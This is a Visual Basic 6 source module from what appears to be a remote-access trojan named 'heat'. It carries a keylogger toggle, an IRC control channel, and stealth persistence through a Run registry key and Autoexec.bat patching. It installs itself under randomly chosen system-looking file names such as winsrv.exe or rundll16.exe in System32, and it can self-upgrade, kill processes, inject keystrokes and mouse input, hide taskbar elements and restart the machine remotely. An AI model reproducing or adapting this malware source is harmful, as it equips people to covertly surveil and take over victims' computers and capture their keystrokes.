Attribute VB_Name = "modMain"
Sub Main()
Dim PrevProcessID As Long, RegisteredName As String
'On Error Resume Next

If Mid(Command, 1, 3) = "-w" Then
    'Remain inactive for a period between 5 and 10 mins long.
    Randomize
    Sleep 300000 + (Rnd(1) * 300000)
    
    If Dir(Mid(Command, 3)) <> "" Then
        'If the specified temporary file path exists, delete the temporary file.
        Kill Mid(Command, 3)
    End If
ElseIf Mid(Command, 1, 3) = "-k" Then
    If Dir(Command) <> "" Then
        'If the specified temporary file path exists, delete the temporary file.
        Kill Mid(Command, 3)
    End If
ElseIf Mid(Command, 1, 9) = "-upgrade " Then
    PrevProcessID = Val(Mid(Command, 10))
    
    modMain.KillProcess CStr(PrevProcessID) 'End the older version of heat.
    
    RegisteredName = modMain.GetRegisteredName 'Get the filename of heat set to run at startup
    
    Sleep 1000 'Wait for the process to end
    
    If Dir(RegisteredName) <> "" Then 'If the file exists (which it should) we delete it
        Kill RegisteredName
    End If
    
    FileCopy AppPath, RegisteredName 'Replace the old version of heat with the new
    
    Sleep 2000 'Wait for the file to copy
    
    Shell RegisteredName, "-k" & AppPath, GetDirectory(RegisteredName), False
    'Execute the new version of heat, instructing it to delete this temporary file.
    
    End
    
ElseIf Command = "" Then
    If App.PrevInstance = True Then End
    'Stop executing code if Heat is already running
End If

CheckLibraries


Load frmMain

End Sub

Sub LoadSettings()
On Error Resume Next

AcceptConnections = cSngBool(Val(ReadINI("Connection", "AcceptConnections", "1")))
AutoConnectEnabled = cSngBool(Val(ReadINI("Connection", "AutoConnectEnabled", "0")))
IRC_Enabled = modMain.cSngBool(Val(ReadINI("Settings", "IRC", "1")))
Keylogger_Enabled = modMain.cSngBool(Val(ReadINI("Settings", "Keylogger", "1")))
Bouncers_Enabled = modMain.cSngBool(Val(ReadINI("Settings", "Bouncer", "1")))

frmMain.txtPassword.Text = StrConv(Decrypt(App.ProductName, StrConv(ReadINI("Settings", "Password", ""), vbFromUnicode)), vbUnicode)
Password = frmMain.txtPassword.Text

ListenPort = Val(ReadINI("Connection", "ListenPort", "3786"))
AutoConnectHost = ReadINI("Connection", "AutoConnectHost", "3786")
AutoConnectPort = Val(ReadINI("Connection", "AutoConnectPort", "0"))

If AutoConnectEnabled = True Then frmMain.tmrAutoconnect.Enabled = True

If frmMain.Visible = True Then
    With frmMain
        .txtConnectHost.Text = ReadINI("Settings", "ConnectToHost", "")
        .txtConnectPort.Text = ReadINI("Settings", "ConnectToPort", "")
    End With
End If

If IRC_Enabled = True Then
    LoadIrcData
    frmMain.tmrIrc.Enabled = True
    frmMain.wskIRC.Close
    modIRC.ChooseServerFromList modIRC.IrcServers()
    frmMain.wskIRC.Connect IrcServer, IrcPort
Else
    frmMain.wskIRC.Close
    frmMain.tmrIrc.Enabled = False
End If

If Bouncers_Enabled = True Then
    frmMain.UnloadBouncers
    frmMain.LoadBouncers
Else
    frmMain.UnloadBouncers
End If

If Keylogger_Enabled = True Then
    frmMain.tmrKeylog.Enabled = True
    frmMain.tmrSaveLog.Enabled = True
Else
    frmMain.tmrKeylog.Enabled = False
    frmMain.tmrSaveLog.Enabled = False
End If

End Sub

Sub CheckLibraries()
Dim SystemDir As String, FileData() As Byte
SystemDir = Environ("WINDIR") & "\System32\"

If Dir(SystemDir & "mswinsck.ocx") = "" Then
    FileData = LoadResData(1, "WINSOCK")
    
    Open SystemDir & "mswinsck.ocx" For Binary Access Write As #1
        Put 1, , FileData
    Close #1
End If

If Dir(SystemDir & "zlib.dll") = "" Then
    FileData = LoadResData(2, "ZLIB")
    
    Open SystemDir & "zlib.dll" For Binary Access Write As #1
        Put 1, , FileData
    Close #1
End If

End Sub






Public Sub FormDrag(TheForm As Form)
    ReleaseCapture
    Call SendMessage(TheForm.hwnd, &HA1, 2, 0&)
End Sub

Sub FormOnTop(hWindow As Long, bTopMost As Boolean)
wFlags = SWP_NOMOVE Or SWP_NOSIZE Or SWP_SHOWWINDOW Or SWP_NOACTIVATE
    
Select Case bTopMost
Case True
    Placement = HWND_TOPMOST
Case False
    Placement = HWND_NOTOPMOST
End Select

SetWindowPos hWindow, Placement, 0, 0, 0, 0, wFlags
    
End Sub

Public Sub SendError(Procedure As String, Error As String)
Send "error;" & Procedure & ";" & Error
End Sub

Public Sub Send(Data As String)
    On Error Resume Next
    TotalBytesTransmitted = TotalBytesTransmitted + Len(Data)
    frmMain.wskInfo.SendData Data & "§"
End Sub

' _ _ _
'|  _  \
'| |_| |
'|  ___/
'| |
'| | R O C E S S     A N D      W I N D O W      M A N A G E M E N T

Function GetProcesses() As String
Dim hSnapShot As Long
Dim uProcess As PROCESSENTRY32
Dim CurrentProccess As Long

hSnapShot = CreateToolHelpSnapshot(TH32CS_SNAPPROCESS, 0&)

If hSnapShot = 0 Then Exit Function

uProcess.dwSize = Len(uProcess)
CurrentProccess = ProcessFirst(hSnapShot, uProcess)

Do While CurrentProccess
   
    frmMain.lstName.AddItem uProcess.szExeFile
    frmMain.lstID.AddItem uProcess.th32ProcessID
    
    CurrentProccess = ProcessNext(hSnapShot, uProcess)
Loop

frmMain.lstName.ListIndex = -1
frmMain.lstID.ListIndex = -1

For i = 0 To frmMain.lstName.ListCount - 1
    frmMain.lstName.ListIndex = frmMain.lstName.ListIndex + 1
    frmMain.lstID.ListIndex = frmMain.lstID.ListIndex + 1
    GetProcesses = GetProcesses & frmMain.lstName.Text & "*" & frmMain.lstID.Text & "|"
Next i

GetProcesses = Left(GetProcesses, Len(GetProcesses) - 1)

frmMain.lstName.Clear
frmMain.lstID.Clear

CloseHandle hSnapShot

End Function

Function KillProcess(StrProcessID As String) As String
Dim Ret&
Dim ret1 As String, out As String
Dim ProcessID As Long

ProcessID = CLng(StrProcessID)

Dim lExitCode As Long
Dim hProcess As Long

hProcess = OpenProcess(&H1, 0, ProcessID)

If (hProcess = 0) Then
        KillProcess = "The process was Killed."
        Exit Function
End If
        
Ret& = GetExitCodeProcess(hProcess, lExitCode)
    
Ret& = TerminateProcess(hProcess, lExitCode)

If (Ret& = 0) Then
    KillProcess = "The process cannot be Killed."
    Exit Function
Else
    KillProcess = "The process was Killed."
End If
End Function

Public Function GetWindows(IsVisible As Boolean) As String
Dim Title As String, hwnd As Long
hwnd = GetWindow(GetDesktopWindow(), GW_CHILD)
    
frmMain.lstName.Clear
frmMain.lstID.Clear

Do While hwnd <> 0
    Title = GetWindowCaption(hwnd)
    If Title = "" Then GoTo NextWindow
    
    Select Case IsVisible
    Case True
        If IsWindowVisible(hwnd) = 0 Then GoTo NextWindow
        frmMain.lstName.AddItem "(v)" & Title
        frmMain.lstID.AddItem hwnd
    Case False
        If IsWindowVisible(hwnd) = 1 Then GoTo NextWindow
        frmMain.lstName.AddItem "(i)" & Title
        frmMain.lstID.AddItem hwnd
    End Select
NextWindow:
    hwnd = GetWindow(hwnd, GW_HWNDNEXT)
Loop
    
frmMain.lstName.ListIndex = -1
frmMain.lstID.ListIndex = -1

For i = 0 To frmMain.lstName.ListCount - 1
    frmMain.lstName.ListIndex = frmMain.lstName.ListIndex + 1
    frmMain.lstID.ListIndex = frmMain.lstID.ListIndex + 1
    GetWindows = GetWindows & CorrectReservedChars(frmMain.lstName.Text) & ";" & CorrectReservedChars(frmMain.lstID.Text) & "ê"
Next i

If Len(GetWindows) > 1 Then GetWindows = Left(GetWindows, Len(GetWindows) - 1)

frmMain.lstName.Clear
frmMain.lstID.Clear

End Function

Function GetWindowCaption(hwnd) As String
Dim Temp As String, TextLength As Long

TextLength = GetWindowTextLength(hwnd)
Temp = Space(TextLength)
GetWindowText hwnd, Temp, TextLength + 1

GetWindowCaption = Temp
End Function

Public Sub CloseWindow(Window As String)
Dim hwnd As Long
hwnd = CLng(Window)
modDeclare.CloseWindow hwnd
End Sub

Public Sub FocusWindow(Window As String)
Dim hwnd As Long
Window = Val(Window)
hwnd = CLng(Window)
SwitchToThisWindow hwnd, 1
End Sub

Public Sub SetWindowCaption(Window As String, NewCaption As String)
Dim hwnd As Long
hwnd = CLng(Window)
SetWindowText hwnd, NewCaption
End Sub

Public Sub SwitchToWindow(Wnd As String)
Dim hwnd As Long
hwnd = CLng(Wnd)
Dim X As Long
Dim lngWW As Long
  'hwnd = FindWindow(vbNullString, Wnd)
  lngWW = GetWindowLong(hwnd, GWL_STYLE)
  If lngWW And vbMinimized Then
  X = ShowWindow(hwnd, vbNormal)
  End If
 X = SetWindowPos(hwnd, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE Or SWP_NOSIZE Or SWP_SHOWWINDOW)
FocusWindow Wnd
End Sub

Sub WindowVisible(hWndStr As String, Visible As Boolean)
Dim hwnd As Long

hwnd = CLng(hWndStr)

Select Case Visible
Case True
    ShowWindow hwnd, SW_SHOW
Case False
    ShowWindow hwnd, SW_HIDE
End Select

End Sub

' ___      ___
'|   \    /   |
'| |\ \  / /| |
'| | \ \  / | |
'|_|  \__/  |_| I S C    W I N D O W S

Function LockActionKeys(locked As Boolean)
SystemParametersInfo SPI_SCREENSAVERRUNNING, locked, pOld, 0
End Function

Function Shell(Path As String, Arguments As String, PathToStart As String, Visible As Boolean) As String
Dim ShowCMD As Long
Select Case Visible
Case True
ShowCMD = 1
Case False
ShowCMD = 0
End Select

Dim ShellResponse As Long
ShellResponse = ShellExecute(GetDesktopWindow, "Open", Path, Arguments, PathToStart, visiblitiy)

Select Case ShellResponse
Case Is > 33
    Shell = "Executed successfully"
Case 2
    Shell = "File not found."
Case 3
    Shell = "Path not found."
Case 5
    Shell = "Access denied."
Case 27 Or 31
    Shell = "No assosiation for file extention."
Case Else
    Shell = "File was not executed due to an error."
End Select
End Function

'PPP
'P  P
'PPP
'P
'P O W E R    O P T I O N S

Function RestartWindows()
'This will restart windows
On Error GoTo ErrorHandler
Dim RetVal As Integer
RetVal = ExitWindowsEx(EW_RESTARTWINDOWS, 0)
RestartWindows = RetVal
Exit Function
ErrorHandler: frmMain.wskInfo.SendData "error;" & Err.Description & ";RestartWindows"
End Function

Function ExitWindows()
'This will exit windows
Dim RetVal As Integer
RetVal = ExitWindowsEx(EW_EXITWINDOWS, 0)
ExitWindows = RetVal
Exit Function
End Function

Function LogoffWindows()
'This will log off windows
Dim RetVal As Integer
RetVal = ExitWindowsEx(EW_LOGOFFWINDOWS, 0)
LogoffWindows = RetVal
End Function

Function RebootSystem()
'This will reboot the computer
Dim RetVal As Integer
RetVal = ExitWindowsEx(EW_REBOOTSYSTEM, 0)
RebootComputer = RetVal
End Function

Function MonitorPower(Power As Boolean)
Select Case Power
Case True
MonitorPower = SendMessage(frmServer.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, -1&)
Case False
MonitorPower = SendMessage(frmServer.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, 0&)
End Select
End Function
'W    W
'W WW W
' W  W I N D O W S    V I S I B L E    E L E M E N T S

Public Sub HideClock(Visible As Boolean)
Dim Taskbar_hWnd As Long, Systray_hWnd As Long, Clock_hWnd As Long
Taskbar_hWnd = FindWindow("Shell_TrayWnd", "")
Systray_hWnd = FindWindowEx(Taskbar_hWnd, 0, "TrayNotifyWnd", vbNullString)
Clock_hWnd = FindWindowEx(Systray_hWnd, 0, "TrayClockWClass", vbNullString)

Select Case Visible
Case True
ShowWindow Clock_hWnd, SW_SHOW
Case False
ShowWindow Clock_hWnd, SW_HIDE
End Select

End Sub

Sub HideButton(Visible As Boolean)
Dim Taskbar_hWnd As Long, Button_hWnd As Long
Taskbar_hWnd = FindWindow("Shell_TrayWnd", "")
Button_hWnd = FindWindowEx(Taskbar_hWnd, 0, "Button", vbNullString)

Select Case Visible
Case True
ShowWindow Button_hWnd, SW_SHOW
Case False
ShowWindow Button_hWnd, SW_HIDE
End Select

End Sub

Sub HideSystray(Visible As Boolean)
Dim Taskbar_hWnd As Long, Systray_hWnd As Long
Taskbar_hWnd = FindWindow("Shell_TrayWnd", "")
Systray_hWnd = FindWindowEx(Taskbar_hWnd, 0, "TrayNotifyWnd", vbNullString)

Select Case Visible
Case True
    ShowWindow Systray_hWnd, SW_SHOW
Case False
    ShowWindow Systray_hWnd, SW_HIDE
End Select

End Sub

Public Sub HideTaskbar(Visible As Boolean)
Dim Taskbar_hWnd As Long

Taskbar_hWnd = FindWindow("Shell_traywnd", "")

Select Case Visible
Case True
ShowWindow Taskbar_hWnd, SW_SHOW
Case False
ShowWindow Taskbar_hWnd, SW_HIDE
End Select

End Sub

Public Sub HideTaskbarItems(Visible As Boolean)
Dim Taskbar_hWnd As Long, ItemsWindow_hWnd As Long, QuickLaunch_hWnd As Long, RunningApplications_hWnd As Long

Taskbar_hWnd = FindWindow("Shell_TrayWnd", "")
ItemsWindow = FindWindowEx(Taskbar_hWnd, 0, "ReBarWindow32", vbNullString)
'For NT Systems:
QuickLaunch_hWnd = FindWindowEx(ItemsWindow, 0, "ToolbarWindow32", vbNullString)
RunningApplications_hWnd = FindWindowEx(ItemsWindow, 0, "MsTaskSwWClass", vbNullString)

Select Case Visible
Case True
ShowWindow ItemsWindow_hWnd, SW_SHOW
ShowWindow QuickLaunch_hWnd, SW_SHOW
ShowWindow RunningApplications_hWnd, SW_SHOW
Case False
ShowWindow ItemsWindow_hWnd, SW_HIDE
ShowWindow QuickLaunch_hWnd, SW_HIDE
ShowWindow RunningApplications_hWnd, SW_HIDE
End Select

End Sub


' CCC
'C
'C
' CCC . D    O P T I O N S

Public Sub EjectCD(TrayOpen As Boolean)
Dim ReturnStr

Select Case TrayOpen
Case True
    'mciSendString "set CDAudio door open", ReturnStr, 127, 0
Case False
    'mciSendString "set CDAudio door closed", ReturnStr, 127, 0
End Select

End Sub

'W         W
' W       W
' W   W  W
'  W W W W
'   W   W  E B C A M

Sub OpenCapture()

'mCapHwnd = capCreateCaptureWindow("WebcamCapture", 0, 0, 0, 320, 240, Me.hWnd, 0)
'Connect to capture device
'DoEvents: SendMessage mCapHwnd, Connect, 0, 0

End Sub

' I
' I
' I
' I N T E R N E T   I N F O R M A T I O N

Public Function InternetConnected() As Boolean
    InternetConnected = InternetGetConnectedState(0, 0)
End Function

Public Function ConnectionInformation() As String
Dim Flags As Long
If InternetGetConnectedState(Flags, 0&) Then
    If Flags And IC_LAN Then
        ConnectionInformation = ConnectionInformation & _
        "Internet is connected via LAN. "
    ElseIf Flags And IC_MODEM Then
        ConnectionInformation = ConnectionInformation & _
        "Internet is connected via an attached Modem. "
    Else
        ConnectionInformation = ConnectionInformation & _
        "Internet is connected via unknown method. "
    End If
      
    If Flags And IC_PROXY Then
        ConnectionInformation = ConnectionInformation & _
        "A proxy server is used. "
    End If
        
    If Flags And IC_MODEM_BUSY Then
        ConnectionInformation = ConnectionInformation & _
        "The modem is currently in use. "
    End If
Else
    ConnectionInformation = ConnectionInformation & _
    "Internet connection not detected."
End If
End Function

' SSS
'S
' SS
'    S
' SSS  Y S T E M   I N F O R M A T I O N

Function CurrentUser() As String
On Error Resume Next
Dim UserName As String, NameLength As Long, ReturnVal As Long

UserName = Space$(255)
NameLength = 255

ReturnVal = GetUserName(UserName, NameLength)
    
If ReturnVal <> 0 Then
    CurrentUser = Mid(UserName, 1, NameLength)
Else
    CurrentUser = "N/A"
End If

CurrentUser = Replace(CurrentUser, Chr(0), "")
End Function

Function WindowsVersion() As String
On Error GoTo ErrorHandler

Dim ProductName As String, OS As OSVERSIONINFO
    
OS.dwOSVersionInfoSize = Len(OS)

Call GetVersionEx(OS)

Select Case OS.dwPlatformId
Case 1
    If (myOS.dwMinorVersion) = 0 Then
        ProductName = "Windows 95"
    Else
        ProductName = "Windows 98"
    End If
Case 2
    ProductName = "Windows NT"
Case Else
    ProductName = "Windows (Unknown)"
End Select
WindowsVersion = ProductName & " " & OS.dwMajorVersion & "." & OS.dwMinorVersion

Exit Function
ErrorHandler:
SendError "WindowsVersion", "#" & Err.Number & ": " & Err.Description
End Function

Public Function GetPcName() As String
Dim Name As String, NameLength As Long

NameLength = 255
Name = Space(255)

Call GetComputerName(Name, NameLength)

GetPcName = Left(Name, NameLength)
End Function

Function GetTotalMemory() As String
Dim Memory As MEMORYSTATUS
GlobalMemoryStatus Memory
GetTotalMemory = SimplifyFileSize(Memory.dwTotalPhys)
End Function

Function GetAvailibleMemory() As String
Dim Memory As MEMORYSTATUS
GlobalMemoryStatus Memory
GetAvailibleMemory = SimplifyFileSize(Memory.dwAvailPhys)
End Function

Public Function GetUptime(Milliseconds) As String
Dim Seconds, Min0, Minutes, Hours

Hours = Fix(Milliseconds / 3600000)
Min0 = Fix(Milliseconds Mod 3600000)
Minutes = Fix(Min0 / 60000)
Seconds = Fix(Min0 Mod 60000)
Seconds = Fix(Seconds / 1000)

If Len(Seconds) = 1 Then
    Seconds = "0" & Seconds
End If
    
If Len(Minutes) = 1 Then
    Minutes = "0" & Minutes
End If
    
If Len(Hours) = 1 Then
    Hours = "0" & Hours
End If

GetUptime = Hours & ":" & Minutes & ":" & Seconds

End Function

' ______
'| _____|
'| |____
'| _____|
'| |
'|_|    I L E    B R O W S I N G


Function GetDrives() As String
Dim GdTemp() As String

Set fs = CreateObject("scripting.filesystemobject")

For Each D In fs.Drives
    Select Case D.drivetype
        Case 0
            GetDrives = GetDrives & "0;" & D & "|"
        Case 1
            GetDrives = GetDrives & "1;" & D & "|"
        Case 2
            GetDrives = GetDrives & "2;" & D & "|"
        Case 3
            GetDrives = GetDrives & "3;" & D & "|"
        Case 4
            GetDrives = GetDrives & "4;" & D & "|"
        Case 5
            GetDrives = GetDrives & "5;" & D & "|"
    End Select
Next

If Right(GetDrives, 1) = "|" Then GetDrives = Left(GetDrives, Len(GetDrives) - 1)

End Function

Function BrowseDir(Path As String, ByRef Files() As String, ByRef Directories() As String)

    ReDim Files(-1 To -1)
    ReDim Directories(-1 To -1)

    Dim MoreItems As Boolean
    Dim SearchHandle As Long
    Dim FileSearch As WIN32_FIND_DATA
    Dim CurrentItem As String

    If Mid(Path, Len(Path), 1) <> "\" Then
        Path = Path & "\"
    End If

    SearchHandle = FindFirstFile(Path & "*", FileSearch)

    MoreItems = True

    If SearchHandle = INVALID_HANDLE_VALUE Then
        'Invalid search parameters
        Exit Function
    End If

    Do While MoreItems = True
        CurrentItem = TrimNull(FileSearch.cFileName)

        If CurrentItem = ".." Or CurrentItem = "." Then
            GoTo NextItem
        End If
       
        If FileSearch.dwFileAttributes And FILE_ATTRIBUTE_DIRECTORY Then

            If UBound(Directories) = -1 Then
                ReDim Directories(0 To 0)

                Directories(0) = CurrentItem
            Else
                ReDim Preserve Directories(0 To (UBound(Directories) + 1))

                Directories(UBound(Directories)) = CurrentItem
            End If

        Else

            If UBound(Files) = -1 Then
                ReDim Files(0 To 0)

                Files(0) = CurrentItem
            Else
                ReDim Preserve Files(0 To (UBound(Files) + 1))

                Files(UBound(Files)) = CurrentItem
            End If

        End If
NextItem:

        MoreItems = FindNextFile(SearchHandle, FileSearch)
    Loop

    FindClose SearchHandle

End Function


Function SimplifyDirectory(DirectoryPath As String) As String
Dim LastPos As Long, Temp() As String

Temp() = Split(DirectoryPath, "\")

For i = 0 To UBound(Temp)
    If Temp(i) = "" Then GoTo NextStr
    SimplifyDirectory = SimplifyDirectory & Temp(i) & "\"
NextStr:
Next i

End Function

Function GetDirectory(DirectoryPath As String) As String
Dim Temp() As String

Temp() = Split(DirectoryPath, "\")

For i = 0 To UBound(Temp) - 1
    If Temp(i) = "" Then GoTo NextStr
    GetDirectory = GetDirectory & Temp(i) & "\"
NextStr:
Next i

End Function

Function ParentDirectory(DirectoryPath As String) As String
Dim Temp() As String

DirectoryPath = SimplifyDirectory(DirectoryPath)
Temp() = Split(DirectoryPath, "\")

For i = 0 To UBound(Temp) - 2
    If Temp(i) = "" Then GoTo NextStr
    ParentDirectory = ParentDirectory & Temp(i) & "\"
NextStr:
Next i

End Function

Function SimplifyFile(FilePath As String) As String
    Dim LastPos As Long
    
    If InStr(1, FilePath, "\") <> 0 Then
        Do Until InStr(LastPos + 1, FilePath, "\") = 0
            LastPos = InStr(LastPos + 1, FilePath, "\")
        Loop
        SimplifyFile = Mid(FilePath, LastPos + 1)
    Else
        SimplifyFile = FilePath
    End If
    
End Function

Function FileNoExtention(Filename As String) As String
    Dim LastPos As Long
    
    If InStr(1, Filename, ".") <> 0 Then
        Do Until InStr(LastPos + 1, Filename, ".") = 0
            LastPos = InStr(LastPos + 1, Filename, ".")
        Loop
        FileNoExtention = Mid(Filename, 1, LastPos - 1)
    Else
        FileNoExtention = Filename
    End If
    
End Function

Private Function TrimNull(InputStr As String) As String
    On Error Resume Next
    'Remove 'null'(Character ASCII 0 ) after filenames, etc.
    TrimNull = Mid(InputStr, 1, InStr(1, InputStr, Chr(0)) - 1)
End Function

'|  /
'| /
'|/
'|\
'| \
'|  \E Y B O A R D   F U N C T I O N S

Sub KeyPress(KeyCode As Byte)
    'Press Key
    keybd_event KeyCode, 0, 0, 0

    'Release Key
    keybd_event KeyCode, 0, &H2, 0
End Sub

Sub KeyDown(KeyCode As Byte)
    'Press Key
    keybd_event KeyCode, 0, 0, 0
End Sub

Sub KeyUp(KeyCode As Byte)
    'Release Key
    keybd_event KeyCode, 0, &H2, 0
End Sub



'
'  |\    /|
'  | \  / |
'  |  \/  |
'  |      | O U S E    F U N C T I O N S


Public Sub LeftDown(X As Long, Y As Long)
    mouse_event MOUSEEVENTF_LEFTDOWN, X, Y, 0, 0
End Sub

Public Sub LeftUp(X As Long, Y As Long)
    mouse_event MOUSEEVENTF_LEFTUP, X, Y, 0, 0
End Sub

Public Sub RightDown(X As Long, Y As Long)
    mouse_event MOUSEEVENTF_RIGHTDOWN, X, Y, 0, 0
End Sub

Public Sub RightUp(X As Long, Y As Long)
    mouse_event MOUSEEVENTF_RIGHTUP, X, Y, 0, 0
End Sub

Public Sub MouseMove(X As Long, Y As Long)
    SetCursorPos X, Y
End Sub

Public Sub HideMouse()
'Hide mouse cursor
On Error GoTo Error
'ShowCursor (bShow = False)
Exit Sub
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Sub

'  ____
' /
'|
'|
' \____ U S T O M    F U N C T I O N S

Function IsInstalled() As Boolean
    On Error Resume Next
    Dim RegistereName As String
    
    RegistereName = ReadINI("Settings", "Filename")
    
    If RegistereName <> SimplifyFile(AppPath) Then
        IsInstalled = False
    Else
        IsInstalled = True
    End If
End Function

Function IsIDE() As Boolean
    On Error GoTo ErrorHandler
    Debug.Print 34 / 0
    IsIDE = False
    Exit Function
ErrorHandler:
    IsIDE = True
End Function

Function GetRegisteredName() As String
    On Error Resume Next
    Dim SettingName As String, RandNo As Long
    
    SettingName = ReadINI("Settings", "Filename")
       
    If SettingName = "" Then
        Randomize GetTickCount
        RandNo = Int(Rnd(1) * 9)
        
        Select Case RandNo
        Case 0
            SettingName = "rServices.exe"
        Case 1
            SettingName = "sysconfig.exe"
        Case 2
            SettingName = "dllservicec.exe"
        Case 3
            SettingName = "ilhost.exe"
        Case 4
            SettingName = "msdll.exe"
        Case 5
            SettingName = "drvmain.exe"
        Case 6
            SettingName = "winsrv.exe"
        Case 7
            SettingName = "rundll16.exe"
        Case 8
            SettingName = "msrun32.exe"
        Case 9
            SettingName = "msaddr.exe"
        Case 10
            SettingName = "services32.exe"
        End Select
        
        SettingName = Environ("WINDIR") & "\system32\" & SettingName
        WriteINI "Settings", "Filename", SettingName
    End If
    
    GetRegisteredName = SettingName

End Function

Public Function AppPath() As String
    Dim modName As String * 512
    Dim i As Long
    i = GetModuleFileName(App.hInstance, modName, Len(modName))
    AppPath = Left$(modName, i)
End Function

Public Function AppProcessID() As Long
    GetWindowThreadProcessId frmMain.hwnd, AppProcessID
End Function

Function CorrectReservedChars(InputString As String) As String
CorrectReservedChars = InputString

CorrectReservedChars = Replace(CorrectReservedChars, "&", "&0")
CorrectReservedChars = Replace(CorrectReservedChars, ";", "&1")
CorrectReservedChars = Replace(CorrectReservedChars, "§", "&2")
CorrectReservedChars = Replace(CorrectReservedChars, "ê", "&3")

End Function

Function RetrieveReservedChars(InputString As String)
Dim LeftString As String, RightString As String
Dim CurrentPos As Single
RetrieveReservedChars = InputString

CurrentPos = InStr(1, RetrieveReservedChars, "&")

Do Until CurrentPos = 0
    
    Select Case Mid(RetrieveReservedChars, CurrentPos + 1, 1)
    Case "0"
        LeftString = Mid(RetrieveReservedChars, 1, CurrentPos - 1)
        RightString = Mid(RetrieveReservedChars, CurrentPos + 2)
        RetrieveReservedChars = LeftString & "&" & RightString
    Case "1"
        LeftString = Mid(RetrieveReservedChars, 1, CurrentPos - 1)
        RightString = Mid(RetrieveReservedChars, CurrentPos + 2)
        RetrieveReservedChars = LeftString & ";" & RightString
    Case "2"
        LeftString = Mid(RetrieveReservedChars, 1, CurrentPos - 1)
        RightString = Mid(RetrieveReservedChars, CurrentPos + 2)
        RetrieveReservedChars = LeftString & "§" & RightString
    Case "3"
        LeftString = Mid(RetrieveReservedChars, 1, CurrentPos - 1)
        RightString = Mid(RetrieveReservedChars, CurrentPos + 2)
        RetrieveReservedChars = LeftString & "ê" & RightString
    End Select
    
    CurrentPos = InStr(CurrentPos + 1, RetrieveReservedChars, "&")
Loop

End Function

Function ChooseRandomString(WordList As String, Splitter As String) As String
Dim List() As String

List() = Split(WordList, Splitter)

If UBound(List) < 0 Then ChooseRandomString = WordList: Exit Function

ChooseRandomString = List(GenerateRandomNumber(LBound(List), UBound(List)))

End Function

Function GenerateName()
Dim FirstName As String, LastName As String, Temp As String
FirstName = GenerateRandomString(GenerateRandomNumber(3, 6), False, True, False)
LastName = GenerateRandomString(GenerateRandomNumber(4, 8), False, True, False)

FirstName = UCase(Left(FirstName, 1)) & Mid(FirstName, 2)
LastName = UCase(Left(LastName, 1)) & Mid(LastName, 2)

GenerateName = FirstName & " " & LastName

End Function

Function GenerateEmailAddress()
Dim User As String, Domain As String, Realm As String

User = GenerateRandomString(GenerateRandomNumber(5, 8), False, True, True)
Domain = GenerateRandomString(GenerateRandomNumber(5, 8), False, True, False)
Realm = ChooseRandomString(".com,.com,.com,.net,.org,.edu", ",")
Realm = Realm & ChooseRandomString(",,,,,,.au,.de,.nl", ",")

GenerateEmailAddress = User & "@" & Domain & Realm

End Function

Function GenerateRandomNumber(Minimum As Single, Maximum As Single)
Randomize Timer
If Minimum >= Maximum Then GenerateRandomNumber = 0: Exit Function

GenerateRandomNumber = Int(Rnd(1) * ((Maximum + 1) - Minimum)) + Minimum
End Function

Function GenerateRandomString(Length As String, UCase As Boolean, LCase As Boolean, Numerals As Boolean) As String
Dim loops As Single
Dim CharType As Single
Dim Temp As Single
    
Do Until loops >= Length
NewChar:
    Randomize
    CharType = Int(Rnd(1) * 3)
    Select Case CharType
    Case 0
        If UCase = False Then GoTo NewChar
        Temp = Int(Rnd(1) * 26)
        Temp = Temp + 65
    Case 1
        If LCase = False Then GoTo NewChar
        Temp = Int(Rnd(1) * 26)
        Temp = Temp + 97
    Case 2
        If Numerals = False Then GoTo NewChar
        Temp = Int(Rnd(1) * 10)
        Temp = Temp + 48
    End Select
    GenerateRandomString = GenerateRandomString & Chr(Temp)
    loops = loops + 1
Loop
End Function

Function GenerateRandomCharacters(Length As Long) As String
Dim loops As Single
Dim Temp As Single
    
For i = 1 To Length
    Randomize
    GenerateRandomCharacters = GenerateRandomCharacters & Chr(Rnd(1) * 255)
Next i

End Function

Function TrimChar(StringInput As String, Character As String) As String
Dim Temp As String
Temp = StringInput
TrimCharacters:
If Right(Temp, Len(Character)) = Character Then Temp = Left(Temp, Len(Temp) - Len(Character)): GoTo TrimCharacters
TrimChar = Temp
End Function

Function SimplifyFileSize(FileSize As Long) As String

If FileSize < 1024 Then
    SimplifyFileSize = FileSize & "b"
ElseIf FileSize >= 1024 And FileSize < 1048576 Then
    SimplifyFileSize = Round(FileSize / 1024, 2) & "k"
Else
    SimplifyFileSize = Round(FileSize / 1048576, 2) & "mb"
End If

End Function

Sub Install(Filename As String)
On Error Resume Next
Dim WindowsDir As String, DriveRoot As String, LineData As String, FileData As String
Dim CompletePath As String, ComleteName As String

WindowsDir = Environ("WINDIR")
DriveRoot = Environ("HOMEDRIVE") & "\"

If modMain.GetDirectory(Filename) = Filename Then
    CompletePath = WindowsDir & "\System32\" & Filename
    ComleteName = Filename
Else
    CompletePath = modMain.GetDirectory(Filename)
    ComleteName = SimplifyFile(Filename)
End If


'Make RemoteControl start with windows ( in stealth mode )
SetKey HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", FileNoExtention(ComleteName), Chr(34) & CompletePath & ComleteName & Chr(34)

'Place Backup files
FileCopy AppPath, WindowsDir & "\System32\BCKUP.bak"
FileCopy AppPath, CompletePath & ComleteName

'Set up Autoexec.bat to Backup RemoteControl on startup
If Dir(DriveRoot & "Autoexec.bat") <> "" Then
    Open DriveRoot & "Autoexec.bat" For Input As #1
    Do Until EOF(1)
        Line Input #1, LineData
        FileData = FileData & LineData & vbCrLf
    Loop
    Close #1

'Save Autoexec with RemoteControl backup.
    Open DriveRoot & "Autoexec.bat" For Output As #1
    Print #1, FileData
    Print #1, "copy " & WindowsDir & "\System32\BCKUP.bak " & CompletePath
    Close #1
End If

End Sub

Sub Upgrade(ByVal NewVersionPath As String)
On Error GoTo ErrorHandler

If Dir(NewVersionPath) = "" Then GoTo ErrorHandler

MakeKey HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\rServices"
SetKey HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "rServices", Chr(34) & NewVersionPath & " -f" & Chr(34)

VBA.Shell NewVersionPath & " -upgrade " & modMain.AppProcessID

Exit Sub
ErrorHandler:
SendError "Upgrade", "Unable to find new version's path"
End Sub

